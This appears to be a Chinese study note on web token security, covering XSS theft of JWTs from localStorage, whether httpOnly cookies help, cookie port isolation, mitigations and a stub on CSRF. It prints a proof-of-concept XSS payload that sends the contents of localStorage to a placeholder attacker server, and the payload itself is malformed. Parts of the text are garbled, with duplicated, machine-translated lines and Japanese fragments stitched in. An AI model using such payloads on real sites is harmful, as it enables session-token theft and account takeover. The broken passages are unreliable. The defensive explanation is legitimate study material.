我猜有的人可能已经想用暴力破解的方式了吧, 或者写一个JavaScript脚本来迭代localStorage中的每一个对象  这里我们可以使用JSON.Stringify来实现, 这个函数可以将localStorage中存储的内容转换为字符串并绕过这种障碍：

下面给出的是利用XSS窃取JWT的完整PoC：

```
<img src=’https://<attacker-server>/yikes?jwt=’+JSON.stringify(localStorage);’--!>

```

根据不同目标系统的实现机制, 上述的PoC可能会给我们提供IdToken、accessToken或其他相关的令牌  IdToken可以用于身份验证并伪装成有问题的用户, 其本质上是帐户接管, 而accessToken可用身份验证端点来生成一个的全新IdToken  

这里最大的问题就在于, 我们无法将传统的Cookie安全标志应用到localStorage中存储的项  


缓解方案


1、永远不要在localStorage中存储任何敏感信息, 比如说JWT或其他关键的凭据信息  localStorage的目的是通过保存网站状态和设置来为用户提供更好的体验度  

2、可以考虑使用Cookie头  

3、设置Cookie头保护机制  

4、永远不要在页面、URL以及其他源代码中显示令牌  

---

无论你把Auth Token放在localStorage还是放在cookie中, 都容易受到XSS风险的影响(在同一个域内......)  

tokenを保存する場所

localStorage
cookie
cookie (http only)
メモリ内 (変数)

人们常说, JWT令牌不应该放在localStorage中  
原因是它们很容易被Javascript读取, 所以如果有XSS, 一个非预期的脚本将被触发, 结果是令牌被盗  
作为一种对策, 许多地方都推荐使用cookies(仅限http)  


が、cookie (http only)も実は無意味

localStorage vs Cookies for Auth Token Storage - 为什么httpOnly Cookies不是更好？

如果有XSS, 脚本无论如何都会被移动   '但是cookie(只有http)不能被脚本读取, 所以这并不重要！' 但是, 如果攻击者创建了自己的服务器, 并在fetch中设置凭证："include", 他就可以把所有东西都发送到攻击者的服务器上, 包括仅有的http cookies  


が、同ドメインな場合のみである

Cookie不提供按端口隔离的功能  如果一个cookie可以被
读取, 则该cookie也可被运行在同一服务器另一端口的
在同一服务器的另一个端口上运行的服务也可以读取  如果一个cookie是
可写的服务, 该cookie也可被运行在同一服务器另一端口的
在同一台服务器的另一个端口上运行的服务也可以写  由于这个原因  
服务器不应同时在同一主机的不同端口上运行相互不信任的服务  
在同一主机的不同端口上运行相互不信任的服务, 并使用cookie来存储安全敏感信息  
敏感信息  

在这个youtube案例中, 所有的cookie看起来都是用凭证："include "泄露的, 因为它们在本地主机域中使用了3000和8000端口  

如果从a.domain到b.domain使用了凭证："include", 那么a.domain的cookies就不会泄漏到b.domain  

目前, Youtube上的帖子也没有列入名单, 不会出现在搜索中  

<br><br>

# CSRF: 跨站请求伪造
全称 Cross-site request forgery 

<br><br>

## CSRF侧重点:
不注入恶意脚本 侧重于请求伪造 借刀杀人, 在用户不知情的情况下, 借助用户的名义干坏事

<br><br>
